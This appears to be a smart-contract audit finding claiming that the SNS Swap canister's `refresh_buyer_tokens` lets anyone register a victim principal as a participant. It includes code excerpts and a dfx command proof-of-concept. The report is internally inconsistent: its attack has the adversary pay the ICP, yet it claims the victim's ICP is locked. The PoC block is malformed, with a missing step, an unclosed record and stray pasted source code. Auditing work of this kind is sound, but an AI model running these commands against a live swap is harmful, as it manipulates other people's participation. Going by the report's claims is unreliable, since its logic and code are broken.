### Title
Unprivileged Caller Can Force Arbitrary Principal into SNS Swap Participation via Missing Caller Validation in `refresh_buyer_tokens` - (File: rs/sns/swap/canister/canister.rs)

### Summary
The `refresh_buyer_tokens` update endpoint on the SNS Swap canister accepts an arbitrary `buyer` principal in its request without validating that the caller is that buyer or is authorized by them. Because anyone can also send ICP to any subaccount on the swap canister, an adversary can combine these two facts to register any victim principal as a swap participant without their consent, locking their ICP and manipulating the swap lifecycle.

### Finding Description
The canister endpoint `refresh_buyer_tokens` in `rs/sns/swap/canister/canister.rs` resolves the buyer principal from the caller-supplied `arg.buyer` field with no authorization check:

```rust
let p: PrincipalId = if arg.buyer.is_empty() {
    caller_principal_id()
} else {
    PrincipalId::from_str(&arg.buyer).unwrap()  // no check that caller == buyer
};
``` [1](#0-0) 

The inner logic `refresh_buyer_token_e8s` then queries the ICP ledger balance of the **caller-supplied** buyer's subaccount on the swap canister:

```rust
let account = Account {
    owner: this_canister.get().0,
    subaccount: Some(principal_to_subaccount(&buyer)),
};
icp_ledger.account_balance(account).await ...
``` [2](#0-1) 

If the balance meets `min_participant_icp_e8s`, the buyer is registered as a participant:

```rust
self.buyers
    .entry(buyer.to_string())
    .or_insert_with(|| BuyerState::new(0))
    .set_amount_icp_e8s(new_balance_e8s);
self.update_total_participation_amounts();
``` [3](#0-2) 

The `RefreshBuyerTokensRequest` proto explicitly documents that the `buyer` field is optional and defaults to the caller, but imposes no restriction on who may supply a different principal:

```proto
message RefreshBuyerTokensRequest {
  // If not specified, the caller is used.
  string buyer = 1;
  optional string confirmation_text = 2;
}
``` [4](#0-3) 

The only other guard is `validate_confirmation_text`, but the confirmation text is a public string set at SNS initialization time and readable by anyone. [5](#0-4) 

The attack path mirrors M-30 exactly:

1. Adversary reads the swap's `min_participant_icp_e8s` and `confirmation_text` (public state).
2. Adversary sends ≥ `min_participant_icp_e8s` ICP to `Account { owner: swap_canister_id, subaccount: principal_to_subaccount(victim) }` on the ICP ledger — a standard, permissionless transfer.
3. Adversary calls `refresh_buyer_tokens` with `buyer = victim_principal` and the correct `confirmation_text`.
4. The swap canister reads the balance of victim's subaccount, finds it sufficient, and registers victim as a participant.

### Impact Explanation
- **Forced participation without consent**: The victim's ICP is now locked in the swap. If the swap commits, the victim's ICP is swept to the SNS governance treasury and the victim receives unwanted SNS tokens they cannot easily liquidate.
- **Swap lifecycle manipulation**: By registering many synthetic participants (each funded by the adversary), the adversary can push `direct_participation_icp_e8s` to `max_direct_participation_icp_e8s`, triggering `can_commit` to return `true` and causing `try_commit` to fire on the next heartbeat — even before the swap's natural end time. This is directly analogous to the M-30 report's "adversary settles the auction prematurely." [6](#0-5) 

- **Blocking legitimate abort**: If the swap would otherwise abort (insufficient participation), the adversary can prevent this by injecting enough ICP to meet `min_direct_participation_icp_e8s`, harming participants who expected a refund.

### Likelihood Explanation
The attack requires no privileged role, no governance majority, and no threshold key. Any unprivileged ingress sender can execute it. The only cost is the ICP sent to the victim's subaccount, which is bounded below by `min_participant_icp_e8s` (configurable per SNS, often 1–100 ICP). An adversary who holds a large position in the SNS token has a direct economic incentive to force the swap to commit. The confirmation text, if present, is publicly readable from the swap's init state.

### Recommendation
- In `refresh_buyer_tokens`, enforce `caller == buyer` unless the caller is an explicitly whitelisted agent (analogous to how `notify_create_canister` in the CMC validates the caller against the creator).
- Alternatively, require the buyer to have previously created a ticket (`new_sale_ticket`) before `refresh_buyer_tokens` can be called on their behalf, since ticket creation already requires the caller to be the buyer. [7](#0-6) 

### Proof of Concept
```

dfx canister call <swap_id> get_sale_parameters '(record {})'

# 2. Send ICP to victim's subaccount on the swap canister (permissionless)
dfx canister call icp_ledger icrc1_transfer '(record {
  to = record {
    owner = principal "<swap_canister_id>";
    subaccount = opt blob "<principal_to_subaccount(victim)>"

  amount = 100_000_000
})'

# 3. Call refresh_buyer_tokens as adversary, specifying victim as buyer
dfx canister call <swap_id> refresh_buyer_tokens '(record {
  buyer = "<victim_principal>";
  confirmation_text = opt "I confirm..."
})'
# → victim is now registered as a participant with 1 ICP
# → if this pushes total ICP to max_direct_participation_icp_e8s,
#    the swap commits on the next heartbeat without victim's consent

    pub async fn refresh_buyer_token_e8s(
        &mut self,
        buyer: PrincipalId,
        confirmation_text: Option<String>,
        this_canister: CanisterId,
        icp_ledger: &dyn ICRC1Ledger,
    ) -> Result<RefreshBuyerTokensResponse, String> {
        use swap_participation::*;

        // These two checks need to be repeated after awaiting the response from the ICP ledger.
        self.validate_lifecycle_is_open()
            .map_err(context_before_awaiting_icp_ledger_response)?;
        self.validate_possibility_of_direct_participation()
            .map_err(context_before_awaiting_icp_ledger_response)?;

        // User input validation doesn't expire after await, so this check doesn't need repetition.
        self.validate_confirmation_text(confirmation_text)?;

        // Look for the token balance of the specified principal's subaccount on 'this' canister.
        let e8s = {
            let account = Account {
                owner: this_canister.get().0,
                subaccount: Some(principal_to_subaccount(&buyer)),
            };
            icp_ledger
                .account_balance(account)
                .await
                .map_err(|x| x.to_string())?
                .get_e8s()
        };

    pub fn can_commit(&self, now_seconds: u64) -> bool {
        if self.lifecycle() != Lifecycle::Open {
            return false;
        }
        // Possible optimization: both 'sufficient_participation' and
        // 'icp_target.is_reached()' compute 'participant_total_icp_e8s', and

        if !self.sufficient_participation() {
            return false;
        }

        // If swap is due, or the target ICP has been reached, return true
        self.swap_due(now_seconds) || self.icp_target_progress().is_reached_or_exceeded()
    }
